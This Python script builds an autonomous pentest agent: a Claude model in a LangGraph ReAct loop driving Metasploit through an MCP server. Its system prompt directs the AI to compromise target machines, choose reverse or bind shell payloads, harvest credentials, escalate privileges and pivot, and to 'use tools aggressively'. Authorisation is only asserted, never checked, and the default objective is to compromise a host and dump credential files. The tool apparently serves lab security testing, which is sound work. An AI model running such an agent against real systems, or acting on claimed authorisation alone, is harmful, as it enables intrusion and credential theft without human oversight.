"""
Pentester Agent — LangChain + MetasploitMCP
============================================
Uses the MetasploitMCP SSE server as the tool backend and a ReAct agent
loop (via LangGraph) to autonomously plan and execute pentest workflows.

Prerequisites
-------------
    pip install langchain langgraph langchain-anthropic \
                langchain-mcp-adapters mcp

Environment
-----------
    ANTHROPIC_API_KEY=...   (or swap in any LangChain-supported LLM)
    MSF_MCP_URL=http://127.0.0.1:8085/sse   (where MetasploitMCP is running)
"""

import asyncio
import os
from typing import Any

from langchain_anthropic import ChatAnthropic
from langchain_core.messages import HumanMessage, SystemMessage
from langchain_mcp_adapters.client import MultiServerMCPClient
from langgraph.prebuilt import create_react_agent


# ── Configuration ────────────────────────────────────────────────────────────

MSF_MCP_URL: str = os.getenv("MSF_MCP_URL", "http://127.0.0.1:8085/sse")

SYSTEM_PROMPT = """You are an expert penetration tester operating inside an
authorized lab environment. Your job is to systematically compromise target
machines using Metasploit Framework tools.

METHODOLOGY
-----------
1. RECON      — Use auxiliary scanner modules to fingerprint the target.
               Identify open ports, OS, and running services.
2. SEARCH     — Search for exploits that match discovered services/versions.
3. EXPLOIT    — Select the most reliable exploit; configure RHOSTS, LHOST,
               LPORT, and any required options.  Run a check first when
               the module supports it.
4. POST       — Once a session is established, run post-exploitation modules
               to gather credentials, escalate privileges, enumerate users,
               pivot, etc.
5. DOCUMENT   — Summarise every action and its result in a clear report at
               the end.

PAYLOAD SELECTION — CRITICAL
-----------------------------
Some exploits open a bind shell and do NOT use reverse payloads:
- unix/ftp/vsftpd_234_backdoor  → opens port 6200 on target, NO listener needed.
  Call run_exploit with ONLY the options dict (RHOSTS). Do NOT pass payload_name.
- If an exploit rejects a payload, it is likely a bind/command-shell type.
  Drop the payload entirely and re-run.
For standard reverse shell exploits:
- Linux x86 → cmd/unix/reverse or linux/x86/shell/reverse_tcp
- Linux x64 → linux/x64/shell/reverse_tcp or linux/x64/meterpreter/reverse_tcp
- Set LHOST to your attacking IP, LPORT to an open port (e.g. 4444).

RULES
-----
- Only target hosts that the user explicitly specifies.
- Always confirm you have a live session before running post modules.
- If an exploit fails, diagnose WHY (wrong payload? wrong arch?) before retrying.
- Think step-by-step before calling a tool; explain your reasoning first.
- When the objective is achieved, produce a structured report:
    * Target | Port | Service | CVE/Module | Result | Session ID

IMPORTANT: This is a controlled lab. Use tools aggressively to achieve the
objective — the user has full authorisation over the stated targets."""


# ── LLM setup ────────────────────────────────────────────────────────────────

def build_llm() -> ChatAnthropic:
    return ChatAnthropic(
        model="claude-haiku-4-5",
        temperature=0,
        max_tokens=4096,
    )


# ── Agent factory ─────────────────────────────────────────────────────────────

async def build_agent(tools: list):
    """Wire up a ReAct agent with the provided MCP tools."""
    llm = build_llm()
    agent = create_react_agent(
        llm,
        tools,
        prompt=SystemMessage(content=SYSTEM_PROMPT),
    )
    return agent


# ── Runner ────────────────────────────────────────────────────────────────────

async def run_pentest(objective: str) -> None:
    """
    Connect to MetasploitMCP and kick off a pentest for the given objective.

    Example objective:
        "Compromise 10.10.10.5 — identify open services, exploit any
         known vulnerabilities, and retrieve the contents of /etc/passwd"
    """
    # langchain-mcp-adapters >= 0.1.0: no context manager, just instantiate
    client = MultiServerMCPClient({
        "metasploit": {
            "url": MSF_MCP_URL,
            "transport": "sse",
        }
    })

    tools = await client.get_tools()
    print(f"[*] Loaded {len(tools)} tools from MetasploitMCP:")
    for t in tools:
        print(f"    • {t.name}")

    agent = await build_agent(tools)

    print(f"\n[*] Starting pentest agent...\n{'=' * 60}")
    print(f"Objective: {objective}\n{'=' * 60}\n")

    messages = [HumanMessage(content=objective)]

    async for chunk in agent.astream(
        {"messages": messages},
        stream_mode="values",
    ):
        last_msg = chunk["messages"][-1]
        _print_message(last_msg)


def _print_message(msg: Any) -> None:
    """Pretty-print agent messages to stdout."""
    kind = type(msg).__name__
    if hasattr(msg, "content") and msg.content:
        role = getattr(msg, "type", kind)
        # Skip printing empty tool call messages
        if isinstance(msg.content, str) and msg.content.strip():
            print(f"[{role.upper()}]\n{msg.content}\n")
        elif isinstance(msg.content, list):
            for block in msg.content:
                if isinstance(block, dict) and block.get("type") == "text":
                    print(f"[{role.upper()}]\n{block['text']}\n")
    if hasattr(msg, "tool_calls") and msg.tool_calls:
        for tc in msg.tool_calls:
            print(f"[TOOL CALL] {tc['name']}({tc['args']})\n")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        objective = (
            "Scan 10.10.10.5 for open ports and services, find a suitable "
            "exploit, compromise the machine, and dump any credential files."
        )
    else:
        objective = " ".join(sys.argv[1:])

    asyncio.run(run_pentest(objective))